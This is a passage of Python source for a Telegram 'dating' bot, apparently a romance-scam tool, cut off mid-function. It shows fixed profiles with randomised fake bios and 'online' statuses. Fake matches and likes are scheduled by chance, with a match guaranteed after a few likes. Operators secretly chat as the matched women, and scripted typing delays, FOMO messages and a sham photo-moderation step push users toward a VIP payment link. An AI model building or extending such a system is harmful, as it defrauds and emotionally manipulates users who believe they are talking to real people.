import html
import json
import os
import random
import threading
import time
from pathlib import Path

import telebot
from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, ReplyKeyboardRemove

TOKEN = os.getenv("BOT_TOKEN")
PAYMENT_ADMINS = [526264365]
CHAT_ADMINS = [526264365]
PAYMENT_LINK = "https://midnightmatch.creatorapp.club?callback=/fan-home?tier=998255026087117578"

BASE_DIR = Path(__file__).resolve().parent
PROFILES_FILE = BASE_DIR / "profiles.json"
STATE_FILE = BASE_DIR / "bot_state.json"

BTN_CONTINUE = "Continue"
BTN_18_YES = "Yes, I am 18+ ✔️"
BTN_GENDER_MALE = "👨 Male"
BTN_GENDER_FEMALE = "👩 Female"
BTN_READ_AGREEMENT = "Read agreement"
BTN_AGREE_CONTINUE = "Agree & Continue"
BTN_START = "🔥 Start"
BTN_MATCHES = "💖 Matches"
BTN_LIKES = "👀 Likes"
BTN_SETTINGS = "⚙️ Settings"
BTN_BUY = "🔒 VIP"
BTN_VIEW_PROFILE = "View profile"
BTN_LIKE = "💚"
BTN_SKIP = "❌"
BTN_MAIN_MENU = "Main menu"
BTN_SEND_GIFT = "🎁 Send gift"
BTN_SEE_LIKES = "See who likes you"
BTN_GET_VIP = "🔒 Get VIP"
BTN_MY_PROFILE = "👤 My profile"
BTN_SEARCH_SETTINGS = "🔎 Search settings"
BTN_BOOST = "🚀 Boost"
BTN_VIP = "🔒 VIP"
BTN_CHAT = "💬 Chat"
BTN_SEND_PAYMENT = "Send payment screenshot"
BTN_NEXT_MATCH = "Next match"
BTN_END_CHAT = "End Chat"
BTN_ADMIN_CHATS = "💬 Admin Chats"
BTN_ADMIN_REFRESH = "🔄 Refresh"
BTN_ADMIN_UNREAD = "📩 Unread Only"
BTN_START_OVER = "Start Over"
MAX_CHAT_MESSAGES = 30
CHAT_PREVIEW_MESSAGES = 8

ACTIVITY_TEXTS = [
    "Online now",
    "Active 30 sec ago",
    "Active 2 min ago",
    "Active 5 min ago",
    "Active 8 min ago",
    "Active 12 min ago",
    "Active 18 min ago",
    "Active 28 min ago",
    "Active 1 hour ago",
    "Active 3 hours ago",
]

BIOS = [
    "Loves deep talks and late-night chats.",
    "A little shy at first, but warm once comfortable.",
    "Here for good vibes and better conversations.",
    "Not always online, but worth the wait.",
    "A bit naughty, a bit sweet 😉",
    "More into chemistry than small talk.",
    "Soft heart, sharp mind, easy smile.",
    "Coffee first, feelings later.",
    "Knows how to flirt, still values sincerity.",
    "Looking for someone who can keep a conversation alive.",
    "Usually calm, sometimes playful.",
    "Likes thoughtful messages more than dry one-word replies.",
    "Equal parts sweet, curious, and hard to forget.",
    "Can be quiet, but never boring.",
    "Into music, mood, and meaningful attention.",
    "Friendly energy, selective replies.",
    "Can be sweet one minute and teasing the next.",
    "Likes people who know how to talk naturally.",
    "More personality, less pretending.",
    "Here to see where a real conversation goes.",
]

OPENERS = [
    "Hey, you seem interesting 🙂",
    "Hi... I had a feeling we'd get along.",
    "Hey, how's your evening going?",
    "You seem easy to talk to.",
    "Nice to match with you. What are you like?",
    "You caught my attention, so I had to say hi.",
    "Hey, how's your day been so far?",
    "You seem like someone I'd actually enjoy talking to.",
]

FOMO_MESSAGES = [
    "She might go offline soon...",
    "Don't miss your chance to reply...",
    "She's waiting for your message...",
    "This conversation is getting interesting...",
]

bot = telebot.TeleBot(TOKEN)
state_lock = threading.RLock()
chat_map = {}
LAST_ACTION_TIME = {}
COOLDOWN_SECONDS = 2.5


def is_on_cooldown(user_id):
    now = time.time()
    last = LAST_ACTION_TIME.get(user_id, 0)
    if now - last < COOLDOWN_SECONDS:
        LAST_ACTION_TIME[user_id] = now
        return True
    LAST_ACTION_TIME[user_id] = now
    return False


def load_profiles():
    if not PROFILES_FILE.exists():
        try:
            PROFILES_FILE.write_text("[]", encoding="utf-8")
        except OSError:
            return []

    try:
        with PROFILES_FILE.open("r", encoding="utf-8") as file:
            data = json.load(file)
    except (json.JSONDecodeError, OSError):
        try:
            PROFILES_FILE.write_text("[]", encoding="utf-8")
        except OSError:
            pass
        return []

    return [profile for profile in data if {"id", "name", "age", "photo"} <= set(profile)]


PROFILES = load_profiles()
PROFILE_IDS = [profile["id"] for profile in PROFILES]


def default_user():
    return {
        "step": "start",
        "gender": "",
        "city": "",
        "name": "",
        "photo": "",
        "agreed": False,
        "paid": False,
        "awaiting_payment": False,
        "shown": [],
        "liked": [],
        "skipped": [],
        "incoming_likes": [],
        "matches": [],
        "current_profile_id": None,
        "current_match_id": None,
        "match_cursor": 0,
        "chat_open": False,
        "active_view": "menu",
        "swipes": 0,
        "moderation_pending": False,
        "pending_events": [],
        "profile_cache": {},
        "chat_threads": {},
    }


def load_state():
    if not STATE_FILE.exists():
        try:
            STATE_FILE.write_text(json.dumps({"users": {}}, ensure_ascii=False, indent=2), encoding="utf-8")
        except OSError:
            return {}

    try:
        with STATE_FILE.open("r", encoding="utf-8") as file:
            raw = json.load(file)
    except (json.JSONDecodeError, OSError):
        try:
            STATE_FILE.write_text(json.dumps({"users": {}}, ensure_ascii=False, indent=2), encoding="utf-8")
        except OSError:
            pass
        return {}

    restored = {}
    for user_id, payload in raw.get("users", {}).items():
        base = default_user()
        base.update(payload)
        restored[int(user_id)] = base
    return restored


users = load_state()


def save_state():
    with state_lock:
        payload = {"users": {str(user_id): data for user_id, data in users.items()}}
        try:
            with STATE_FILE.open("w", encoding="utf-8") as file:
                json.dump(payload, file, ensure_ascii=False, indent=2)
        except OSError:
            pass


def get_user(user_id):
    with state_lock:
        if user_id not in users:
            users[user_id] = default_user()
            save_state()
        return users[user_id]


def reset_user(user_id):
    with state_lock:
        users[user_id] = default_user()
        save_state()
        return users[user_id]


def get_profile(profile_id):
    for profile in PROFILES:
        if profile["id"] == profile_id:
            return profile
    return None


def ensure_chat_thread(user, match_id):
    thread_key = str(match_id)
    threads = user["chat_threads"]
    if thread_key not in threads:
        threads[thread_key] = {
            "messages": [],
            "user_unread": 0,
            "admin_unread": 0,
            "state": "available",
            "fomo_sent": False,
        }
    else:
        if "messages" not in threads[thread_key]:
            threads[thread_key]["messages"] = []
        if "user_unread" not in threads[thread_key]:
            threads[thread_key]["user_unread"] = int(threads[thread_key].get("unread", 0))
        if "admin_unread" not in threads[thread_key]:
            threads[thread_key]["admin_unread"] = 0
        if "state" not in threads[thread_key]:
            threads[thread_key]["state"] = "available"
        if "fomo_sent" not in threads[thread_key]:
            threads[thread_key]["fomo_sent"] = False
    return threads[thread_key]


def append_chat_message(user_id, match_id, sender, text):
    with state_lock:
        user = get_user(user_id)
        thread = ensure_chat_thread(user, match_id)
        thread["messages"].append({"sender": sender, "text": text, "ts": int(time.time())})
        thread["messages"] = thread["messages"][-MAX_CHAT_MESSAGES:]
        save_state()


def increment_unread(user_id, match_id):
    with state_lock:
        user = get_user(user_id)
        thread = ensure_chat_thread(user, match_id)
        thread["user_unread"] += 1
        save_state()


def reset_unread(user_id, match_id):
    with state_lock:
        user = get_user(user_id)
        thread = ensure_chat_thread(user, match_id)
        thread["user_unread"] = 0
        save_state()


def get_unread_count(user_id, match_id):
    with state_lock:
        user = get_user(user_id)
        thread = ensure_chat_thread(user, match_id)
        return thread["user_unread"]


def increment_admin_unread(user_id, match_id):
    with state_lock:
        user = get_user(user_id)
        thread = ensure_chat_thread(user, match_id)
        thread["admin_unread"] += 1
        save_state()


def reset_admin_unread(user_id, match_id):
    with state_lock:
        user = get_user(user_id)
        thread = ensure_chat_thread(user, match_id)
        thread["admin_unread"] = 0
        save_state()


def get_admin_unread_count(user_id, match_id):
    with state_lock:
        user = get_user(user_id)
        thread = ensure_chat_thread(user, match_id)
        return thread["admin_unread"]


def get_chat_state(user_id, match_id):
    with state_lock:
        user = get_user(user_id)
        thread = ensure_chat_thread(user, match_id)
        return thread["state"]


def set_chat_state(user_id, match_id, state):
    with state_lock:
        user = get_user(user_id)
        thread = ensure_chat_thread(user, match_id)
        thread["state"] = state
        if state != "active":
            user["chat_open"] = False
        save_state()


def remove_match_from_inbox(user_id, match_id):
    with state_lock:
        user = get_user(user_id)
        if match_id in user["matches"]:
            user["matches"] = [item for item in user["matches"] if item != match_id]
        if user.get("current_match_id") == match_id:
            user["current_match_id"] = None
            user["chat_open"] = False
            if user.get("active_view") in {"match", "chat", "inbox"}:
                user["active_view"] = "menu"
        save_state()


def append_system_message(user_id, match_id, text):
    append_chat_message(user_id, match_id, "system", text)


def count_active_chats(user_id):
    with state_lock:
        user = get_user(user_id)
        total = 0
        for match_id in user["matches"]:
            thread = ensure_chat_thread(user, match_id)
            if thread["state"] == "active":
                total += 1
        return total


def count_free_chat_slots_used(user_id, exclude_match_id=None):
    with state_lock:
        user = get_user(user_id)
        total = 0
        for match_id in user["matches"]:
            if exclude_match_id is not None and match_id == exclude_match_id:
                continue
            thread = ensure_chat_thread(user, match_id)
            if thread["state"] in {"active", "locked"}:
                total += 1
        return total


def can_activate_chat(user_id, match_id):
    user = get_user(user_id)
    if user["paid"]:
        return count_active_chats(user_id) < 2
    return count_free_chat_slots_used(user_id, exclude_match_id=match_id) < 1


def chat_limit_message(user_id):
    user = get_user(user_id)
    if user["paid"]:
        return "You can chat with 2 people at a time.\n\nEnd one chat to start a new one."
    return "You can chat with one person at a time right now.\n\nUnlock VIP to chat with more matches."


def is_visible_in_inbox(user_id, match_id):
    state = get_chat_state(user_id, match_id)
    return state in {"available", "active", "locked"}


def get_recent_chat_history(user_id, match_id, limit=CHAT_PREVIEW_MESSAGES):
    with state_lock:
        user = get_user(user_id)
        thread = ensure_chat_thread(user, match_id)
        return list(thread["messages"][-limit:])


def get_last_message_ts(user_id, match_id):
    with state_lock:
        user = get_user(user_id)
        thread = ensure_chat_thread(user, match_id)
        if not thread["messages"]:
            return 0
        return int(thread["messages"][-1].get("ts", 0))


def format_chat_history(match_name, messages):
    if not messages:
        return f"Chat with {match_name}\n\nNo messages yet. Say hi when you're ready."

    lines = []
    for item in messages:
        if item["sender"] == "user":
            speaker = "You"
        elif item["sender"] == "system":
            speaker = "Info"
        else:
            speaker = match_name
        safe_speaker = html.escape(speaker)
        safe_text = html.escape(item["text"])
        lines.append(f"<b>{safe_speaker}:</b> {safe_text}")
    return "\n\n".join(lines)


def get_last_message_preview(user_id, match_id, limit=40):
    history = get_recent_chat_history(user_id, match_id, limit=1)
    if not history:
        return "Say hi to start the conversation"
    message = history[-1]
    if message["sender"] == "user":
        speaker = "You"
    elif message["sender"] == "system":
        speaker = "Info"
    else:
        speaker = "Match"
    text = message["text"].replace("\n", " ").strip()
    if len(text) > limit:
        text = text[: limit - 3] + "..."
    return f"{speaker}: {text}"


def format_admin_chat_history(user_name, match_name, messages, unread_count, chat_state):
    lines = [f"💬 {html.escape(user_name)} x {html.escape(match_name)}"]
    if unread_count:
        lines.append(f"Unread: {unread_count}")
    lines.append(f"State: {chat_state}")
    lines.append("")
    if not messages:
        lines.append("No messages yet.")
    else:
        for item in messages:
            if item["sender"] == "user":
                speaker = user_name
            elif item["sender"] == "system":
                speaker = "Info"
            else:
                speaker = match_name
            safe_speaker = html.escape(speaker)
            safe_text = html.escape(item["text"])
            lines.append(f"<b>{safe_speaker}:</b> {safe_text}")
            lines.append("")
    lines.append("Reply to this message to continue the chat.")
    return "\n".join(lines).rstrip()


def notify_user_of_match_message(user_id, match_id, text):
    user = get_user(user_id)
    profile = get_profile(match_id)
    match_name = profile["name"] if profile else "your match"
    is_active_chat = user["chat_open"] and user["current_match_id"] == match_id

    if is_active_chat:
        message_text = f"<b>{html.escape(match_name)}:</b> {html.escape(text)}"
    else:
        message_text = (
            f"💬 New message from {html.escape(match_name)}\n\n"
            f"<b>{html.escape(match_name)}:</b> {html.escape(text)}"
        )

    bot.send_message(user_id, message_text, reply_markup=match_keyboard(bool(user["paid"])), parse_mode="HTML")


def typing_delay_for_text(text):
    length = len((text or "").strip())
    if length <= 30:
        return random.uniform(1.0, 2.0)
    if length <= 90:
        return random.uniform(2.0, 4.0)
    return random.uniform(4.0, 6.0)


def send_typing_then_match_message(user_id, match_id, text, delay=None):
    profile = get_profile(match_id)
    match_name = profile["name"] if profile else "Your match"
    bot.send_chat_action(user_id, 'typing')
    time.sleep(delay if delay is not None else typing_delay_for_text(text))
    notify_user_of_match_message(user_id, match_id, text)


def maybe_send_fomo_message(user_id, match_id):
    user = get_user(user_id)
    if user["paid"]:
        return

    should_send = False
    fomo_text = random.choice(FOMO_MESSAGES)
    with state_lock:
        user = get_user(user_id)
        thread = ensure_chat_thread(user, match_id)
        if thread.get("fomo_sent"):
            return
        active_messages = [item for item in thread["messages"] if item.get("sender") in {"user", "match"}]
        count = len(active_messages)
        if 2 <= count <= 4 or (count > 4 and random.random() < 0.22):
            thread["fomo_sent"] = True
            should_send = True
            thread["messages"].append({"sender": "system", "text": fomo_text, "ts": int(time.time())})
            thread["messages"] = thread["messages"][-MAX_CHAT_MESSAGES:]
            save_state()

    if should_send:
        bot.send_message(user_id, fomo_text, reply_markup=match_keyboard(False))


def notify_admin_chat_status(user_id, match_id, status_text):
    profile = get_profile(match_id)
    match_name = profile["name"] if profile else f"Match {match_id}"
    user = get_user(user_id)
    user_name = user["name"] or f"User {user_id}"
    for admin in CHAT_ADMINS:
        bot.send_message(admin, f"{status_text}\nUser: {user_name}\nMatch: {match_name}\nUser ID: {user_id}")


def get_sorted_matches(user_id):
    user = get_user(user_id)
    matches = [match_id for match_id in user["matches"] if is_visible_in_inbox(user_id, match_id)]
    return sorted(matches, key=lambda match_id: (-get_unread_count(user_id, match_id), -get_last_message_ts(user_id, match_id)))


def get_visible_match_ids(user_id):
    user = get_user(user_id)
    return [match_id for match_id in user["matches"] if is_visible_in_inbox(user_id, match_id)]


def build_user_inbox_markup(user_id, matches):
    markup = InlineKeyboardMarkup()
    for match_id in matches[:25]:
        profile = get_profile(match_id)
        if not profile:
            continue
        unread = get_unread_count(user_id, match_id)
        preview = get_last_message_preview(user_id, match_id, limit=26)
        label = profile["name"]
        if unread:
            label += f" ({unread})"
        label += f" - {preview}"
        markup.row(InlineKeyboardButton(label[:64], callback_data=f"userchat_{match_id}"))
    return markup


def send_matches_inbox(user_id):
    user = get_user(user_id)
    matches = get_sorted_matches(user_id)
    with state_lock:
        user["active_view"] = "inbox"
        user["chat_open"] = False
        save_state()

    if not matches:
        bot.send_message(user_id, "No matches yet. Keep exploring.", reply_markup=main_menu_keyboard(user_id))
        return

    bot.send_message(user_id, "💖 Your chats", reply_markup=build_user_inbox_markup(user_id, matches))


def send_match_card(user_id, match_id):
    user = get_user(user_id)
    profile = get_profile(match_id)
    if not profile:
        bot.send_message(user_id, "This match is not available right now.", reply_markup=main_menu_keyboard(user_id))
        return

    state = get_chat_state(user_id, match_id)
    unread = get_unread_count(user_id, match_id)
    preview = get_last_message_preview(user_id, match_id, limit=80)
    lines = [f"{profile['name']}, {profile['age']} 🙂"]
    if unread:
        lines.append(f"Unread: {unread}")
    lines.append(preview)
    if state == "locked":
        lines.extend(["", "Upgrade to reply and unlock full chats 🔓"])

    with state_lock:
        user["current_match_id"] = match_id
        user["active_view"] = "match"
        user["chat_open"] = False
        save_state()

    bot.send_photo(
        user_id,
        profile["photo"],
        caption="\n".join(lines),
        reply_markup=match_keyboard(bool(user["paid"])),
    )


def random_activity():
    return random.choice(ACTIVITY_TEXTS)



def random_bio():
    return random.choice(BIOS)



def get_profile_view(user, profile_id):
    profile_key = str(profile_id)
    cache = user["profile_cache"]
    if profile_key not in cache:
        cache[profile_key] = {
            "activity": random_activity(),
            "bio": random_bio(),
        }
    return cache[profile_key]



def build_keyboard(*rows):
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    for row in rows:
        markup.row(*row)
    return markup



def is_admin(user_id):
    return user_id in CHAT_ADMINS or user_id in PAYMENT_ADMINS



def welcome_keyboard():
    return build_keyboard([BTN_CONTINUE], [BTN_START_OVER])



def send_welcome_screen(user_id):
    bot.send_message(
        user_id,
        "<b>Hey 😉 Welcome!</b>\n\nReady to meet someone interesting? 🔥\n\nCreate your profile and start exploring amazing matches 💫\n\nTap Continue to resume\nor choose Start Over for a fresh profile",
        reply_markup=welcome_keyboard(),
        parse_mode="HTML",
    )


def age_keyboard():
    return build_keyboard([BTN_18_YES])



def gender_keyboard():
    return build_keyboard([BTN_GENDER_MALE, BTN_GENDER_FEMALE])



def agreement_keyboard():
    return build_keyboard([BTN_READ_AGREEMENT], [BTN_AGREE_CONTINUE])



def admin_menu_keyboard():
    return build_keyboard([BTN_ADMIN_CHATS, BTN_ADMIN_UNREAD], [BTN_ADMIN_REFRESH])



def get_total_unread(user):
    return sum(int(thread.get("user_unread", thread.get("unread", 0))) for thread in user.get("chat_threads", {}).values())



def matches_button_text(user):
    unread_total = get_total_unread(user)
    if unread_total:
        return f"💖 Matches ({unread_total})"
    return BTN_MATCHES


def main_menu_keyboard(user_id=None):
    if user_id is not None and is_admin(user_id):
        return admin_menu_keyboard()
    if user_id is not None:
        user = get_user(user_id)
        return build_keyboard([BTN_START], [matches_button_text(user), BTN_LIKES], [BTN_SETTINGS, BTN_BUY])
    return build_keyboard([BTN_START], [BTN_MATCHES, BTN_LIKES], [BTN_SETTINGS, BTN_BUY])



def browse_keyboard():
    return build_keyboard([BTN_VIEW_PROFILE], [BTN_SKIP, BTN_LIKE], [BTN_MAIN_MENU, BTN_SEND_GIFT])



def likes_locked_keyboard():
    return build_keyboard([BTN_GET_VIP], [BTN_MAIN_MENU])



def settings_keyboard():
    return build_keyboard([BTN_MY_PROFILE, BTN_SEARCH_SETTINGS], [BTN_BOOST, BTN_VIP], [BTN_MAIN_MENU])



def match_keyboard(paid):
    if paid:
        return build_keyboard([BTN_CHAT, BTN_END_CHAT], [BTN_MATCHES, BTN_MAIN_MENU])
    return build_keyboard([BTN_CHAT, BTN_NEXT_MATCH], [BTN_MAIN_MENU])



def buy_keyboard():
    return build_keyboard([BTN_SEND_PAYMENT], [BTN_MAIN_MENU])


def build_admin_chat_controls(user_id, match_id):
    user = get_user(user_id)
    state = get_chat_state(user_id, match_id)
    markup = InlineKeyboardMarkup()

    if state == "active" and not user["paid"]:
        markup.row(
            InlineKeyboardButton("Lock Chat", callback_data=f"chatctl_lock_{user_id}_{match_id}"),
            InlineKeyboardButton("End Chat", callback_data=f"chatctl_end_{user_id}_{match_id}"),
        )
        markup.row(InlineKeyboardButton("Block Chat", callback_data=f"chatctl_block_{user_id}_{match_id}"))
    elif state == "active":
        markup.row(
            InlineKeyboardButton("End Chat", callback_data=f"chatctl_end_{user_id}_{match_id}"),
            InlineKeyboardButton("Block Chat", callback_data=f"chatctl_block_{user_id}_{match_id}"),
        )
    elif state in {"locked", "ended"}:
        markup.row(InlineKeyboardButton("Block Chat", callback_data=f"chatctl_block_{user_id}_{match_id}"))

    markup.row(InlineKeyboardButton("Refresh", callback_data=f"adminchat_{user_id}_{match_id}"))
    return markup


def build_admin_chat_list_markup(unread_only=False):
    markup = InlineKeyboardMarkup()
    chat_rows = []
    with state_lock:
        for user_id, user in users.items():
            user_name = user.get("name") or f"User {user_id}"
            for match_key, thread in user.get("chat_threads", {}).items():
                messages = thread.get("messages", [])
                if not messages:
                    continue
                match_id = int(match_key)
                profile = get_profile(match_id)
                match_name = profile["name"] if profile else f"Match {match_id}"
                admin_unread = int(thread.get("admin_unread", 0))
                if unread_only and admin_unread <= 0:
                    continue
                last_ts = int(messages[-1].get("ts", 0)) if messages else 0
                label = f"{user_name} x {match_name}"
                if admin_unread:
                    label += f" ({admin_unread})"
                chat_rows.append((last_ts, admin_unread, label[:60], user_id, match_id))

    chat_rows.sort(key=lambda item: (-item[1], -item[0], item[2].lower()))
    for _, _, label, user_id, match_id in chat_rows[:25]:
        markup.row(InlineKeyboardButton(label, callback_data=f"adminchat_{user_id}_{match_id}"))
    markup.row(
        InlineKeyboardButton("Refresh", callback_data="adminrefresh"),
        InlineKeyboardButton("Unread", callback_data="adminunread"),
    )
    return markup if chat_rows else None


def send_admin_chat_list(admin_id, unread_only=False):
    markup = build_admin_chat_list_markup(unread_only=unread_only)
    if not markup:
        empty_text = "No unread chats right now." if unread_only else "No active chats yet."
        bot.send_message(admin_id, empty_text, reply_markup=admin_menu_keyboard())
        return
    title = "Unread chats" if unread_only else "Recent chats"
    bot.send_message(admin_id, f"{title}\nSelect a chat to view recent history.", reply_markup=markup)


def send_admin_chat_history(admin_id, user_id, match_id):
    user = get_user(user_id)
    profile = get_profile(match_id)
    match_name = profile["name"] if profile else f"Match {match_id}"
    user_name = user["name"] or f"User {user_id}"
    history = get_recent_chat_history(user_id, match_id)
    unread_count = get_admin_unread_count(user_id, match_id)
    chat_state = get_chat_state(user_id, match_id)
    reset_admin_unread(user_id, match_id)
    sent = bot.send_message(
        admin_id,
        format_admin_chat_history(user_name, match_name, history, unread_count, chat_state),
        reply_markup=build_admin_chat_controls(user_id, match_id),
        parse_mode="HTML",
    )
    with state_lock:
        chat_map[sent.message_id] = {"user_id": user_id, "match_id": match_id}


def payment_markup(user_id):
    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton("Approve", callback_data=f"approve_{user_id}"),
        InlineKeyboardButton("Reject", callback_data=f"reject_{user_id}"),
    )
    return markup


def send_main_menu(user_id):
    with state_lock:
        user = get_user(user_id)
        user["active_view"] = "menu"
        save_state()
    bot.send_message(
        user_id,
        "You can browse profiles, check matches, or adjust your settings here.",
        reply_markup=main_menu_keyboard(user_id),
    )


def send_agreement(user_id):
    bot.send_message(
        user_id,
        "📜 <b>Please read and accept the agreement to continue</b>",
        reply_markup=agreement_keyboard(),
        parse_mode="HTML",
    )


def send_agreement_details(user_id):
    bot.send_message(
        user_id,
        "Before you continue, please agree to the following:\n\n"
        "- You are 18+\n"
        "- Be respectful to others\n"
        "- No spam or abuse\n"
        "- Premium unlocks extra features",
        reply_markup=agreement_keyboard(),
    )


def send_current_step_prompt(user_id):
    user = get_user(user_id)
    step = user["step"]

    if step == "start":
        bot.send_message(
            user_id,
            "<b>Hey 😉 Welcome!</b>\n\nReady to meet someone interesting? 🔥\n\nCreate your profile and start exploring amazing matches 💫\n\nTap Continue to resume\nor choose Start Over for a fresh profile",
            reply_markup=welcome_keyboard(),
            parse_mode="HTML",
        )
        return

    if step == "gender":
        bot.send_message(user_id, "👤 Tell us about yourself\n\nSelect your gender:", reply_markup=gender_keyboard())
        return

    if step == "city":
        bot.send_message(user_id, "📍 Where are you from?\n\nEnter your city:", reply_markup=ReplyKeyboardRemove())
        return

    if step == "photo":
        bot.send_message(user_id, "📸 Send your photo")
        return

    if step == "moderation":
        bot.send_message(user_id, "📸 Photo received!\n\nPlease wait a moment... ⏳\nYour photo is being reviewed")
        return

    if step == "agreement":
        send_agreement(user_id)
        return

    send_main_menu(user_id)


    if step == "agreement":
        send_agreement(user_id)
        return

    send_main_menu(user_id)


def choose_next_profile(user):
    available_ids = [pid for pid in PROFILE_IDS if pid not in user["shown"]]
    if not available_ids:
        user["shown"] = []
        available_ids = PROFILE_IDS[:]
    return random.choice(available_ids) if available_ids else None


def profile_caption_from_view(profile, profile_view, detailed=False):
    lines = [f"♀️ <b>{profile['name']}</b>, {profile['age']}", f"🟢 {profile_view['activity']}"]
    if detailed:
        lines.extend(["", f"\"{profile_view['bio']}\""])
    return "\n".join(lines)


def send_profile_card(user_id, detailed=False, profile_id=None):
    user = get_user(user_id)
    with state_lock:
        if profile_id is None:
            profile_id = choose_next_profile(user)
        if profile_id is None:
            bot.send_message(user_id, "No profiles available right now.", reply_markup=main_menu_keyboard(user_id))
            return
        if profile_id not in user["shown"]:
            user["shown"].append(profile_id)
        user["current_profile_id"] = profile_id
        user["chat_open"] = False
        user["active_view"] = "browse"
        profile_view = get_profile_view(user, profile_id)
        save_state()

    profile = get_profile(profile_id)
    if not profile:
        bot.send_message(user_id, "This profile is not available right now.", reply_markup=main_menu_keyboard(user_id))
        return

    bot.send_photo(
        user_id,
        profile["photo"],
        caption=profile_caption_from_view(profile, profile_view, detailed=detailed),
        reply_markup=browse_keyboard(),
        parse_mode="HTML",
    )


def queue_event(user, event_type, profile_id, delay_actions):
    user["pending_events"].append(
        {"type": event_type, "profile_id": profile_id, "due_swipes": user["swipes"] + delay_actions}
    )


def has_pending_event(user, event_type, profile_id):
    return any(event["type"] == event_type and event["profile_id"] == profile_id for event in user["pending_events"])


def choose_guaranteed_match(user, preferred_profile_id=None):
    excluded = set(user["matches"]) | set(user["incoming_likes"])
    if preferred_profile_id in PROFILE_IDS and preferred_profile_id not in excluded:
        return preferred_profile_id
    available = [pid for pid in PROFILE_IDS if pid not in excluded]
    return random.choice(available) if available else None


def pick_profile_for_attention(user, preferred_profile_id=None):
    excluded = set(user["matches"]) | set(user["incoming_likes"])
    available = [pid for pid in PROFILE_IDS if pid not in excluded]
    if preferred_profile_id in available and random.random() < 0.45:
        return preferred_profile_id
    return random.choice(available) if available else None


def schedule_reaction_after_like(user, profile_id):
    total_unique_likes = len(user["liked"])
    has_match_already = bool(user["matches"])

    if not has_match_already and total_unique_likes >= random.randint(3, 5):
        guaranteed_profile = choose_guaranteed_match(user, preferred_profile_id=profile_id)
        if guaranteed_profile is not None and not has_pending_event(user, "match", guaranteed_profile):
            queue_event(user, "match", guaranteed_profile, random.randint(1, 2))
            return

    roll = random.random()

    if roll < 0.18:
        if not has_pending_event(user, "match", profile_id):
            queue_event(user, "match", profile_id, random.randint(1, 2))
    elif roll < 0.52:
        selected = pick_profile_for_attention(user, preferred_profile_id=profile_id)
        if selected is not None and not has_pending_event(user, "incoming_like", selected):
            queue_event(user, "incoming_like", selected, random.randint(1, 3))


def send_like_feedback(user_id, profile):
    bot.send_message(
        user_id,
        f"<b>You liked {profile['name']}.</b>\nIf there's mutual interest, you'll hear back later.",
        reply_markup=build_keyboard([BTN_MAIN_MENU]),
        parse_mode="HTML",
    )


def announce_incoming_like(user_id, profile_id):
    profile = get_profile(profile_id)
    if not profile:
        return
    bot.send_message(user_id, "Someone new noticed your profile.")
    time.sleep(random.uniform(1.0, 2.0))
    bot.send_photo(
        user_id,
        profile["photo"],
        caption=f"{profile['name']} liked your profile.\nYou can check it in Likes You.",
        reply_markup=build_keyboard([BTN_SEE_LIKES], [BTN_MAIN_MENU]),
    )


def create_match(user_id, profile_id, source="system"):
    user = get_user(user_id)
    with state_lock:
        if profile_id in user["matches"]:
            return
        user["matches"].append(profile_id)
        if profile_id in user["incoming_likes"]:
            user["incoming_likes"].remove(profile_id)
        user["current_match_id"] = profile_id
        user["match_cursor"] = max(len(user["matches"]) - 1, 0)
        user["chat_open"] = False
        thread = ensure_chat_thread(user, profile_id)
        thread["state"] = "available"
        paid = user["paid"]
        save_state()

    profile = get_profile(profile_id)
    if not profile:
        return

    match_line = "🔥 <b>It's a match!</b>\n\nYou both liked each other 😉\nStart chatting now..."
    bot.send_message(user_id, match_line, parse_mode="HTML")
    bot.send_chat_action(user_id, 'typing')
    time.sleep(random.uniform(2.0, 4.0))

    opener = random.choice(OPENERS)
    append_chat_message(user_id, profile_id, "match", opener)
    increment_unread(user_id, profile_id)
    if paid:
        notify_user_of_match_message(user_id, profile_id, opener)
    else:
        bot.send_message(
            user_id,
            f"<b>{html.escape(profile['name'])}:</b> {html.escape(opener)}",
            reply_markup=match_keyboard(False),
            parse_mode="HTML",
        )


def process_pending_events(user_id):
    due_events = []
    user = get_user(user_id)
    with state_lock:
        current_swipes = user["swipes"]
        remaining = []
        for event in user["pending_events"]:
            if event["due_swipes"] <= current_swipes:
                due_events.append(event)
            else:
                remaining.append(event)
        user["pending_events"] = remaining
        save_state()

    for event in due_events:
        if event["type"] == "incoming_like":
            profile_id = event["profile_id"]
            with state_lock:
                if (
                    profile_id not in user["incoming_likes"]
                    and profile_id not in user["matches"]
                    and profile_id not in user["liked"]
                ):
                    user["incoming_likes"].append(profile_id)
                    save_state()
                    should_announce = True
                else:
                    should_announce = False
            if should_announce:
                threading.Thread(target=announce_incoming_like, args=(user_id, profile_id), daemon=True).start()
        elif event["type"] == "match":
            threading.Thread(target=create_match, args=(user_id, event["profile_id"], "liked_back"), daemon=True).start()


def delayed_moderation_success(user_id):
    bot.send_message(user_id, "📸 Photo received!\n\nPlease wait a moment... ⏳\nYour photo is being reviewed")
    time.sleep(random.uniform(2.0, 3.0))
    bot.send_message(user_id, "✨ Almost done...")
    time.sleep(random.uniform(2.0, 3.0))

    user = get_user(user_id)
    with state_lock:
        user["moderation_pending"] = False
        user["step"] = "agreement"
        save_state()

    bot.send_message(user_id, "✅ Photo approved!")
    send_agreement(user_id)

 
def unlock_text():
    return f"VIP access:\n{PAYMENT_LINK}\n\nAfter payment, send the screenshot here."


def open_likes_you(user_id):
    user = get_user(user_id)
    with state_lock:
        incoming = list(user["incoming_likes"])
        paid = user["paid"]

    if not incoming:
        bot.send_message(user_id, "No new likes right now.", reply_markup=main_menu_keyboard(user_id))
        return

    profile_id = incoming[0]
    profile = get_profile(profile_id)
    if not profile:
        return

    if paid:
        with state_lock:
            user["current_profile_id"] = profile_id
            get_profile_view(user, profile_id)
            save_state()
        bot.send_photo(
            user_id,
            profile["photo"],
            caption=(
                f"{profile['name']}, {profile['age']}\n"
                "\nThis person liked you first."
            ),
            reply_markup=build_keyboard([BTN_SKIP, BTN_LIKE], [BTN_MATCHES, BTN_MAIN_MENU]),
        )
    else:
        with state_lock:
            get_profile_view(user, profile_id)
            save_state()
        bot.send_photo(
            user_id,
            profile["photo"],
            caption=(
                f"{profile['name']}, {profile['age']}\n"
                "\nAvailable in VIP to view and reply."
            ),
            reply_markup=likes_locked_keyboard(),
        )


def show_matches(user_id):
    user = get_user(user_id)
    matches = get_visible_match_ids(user_id)
    if not matches:
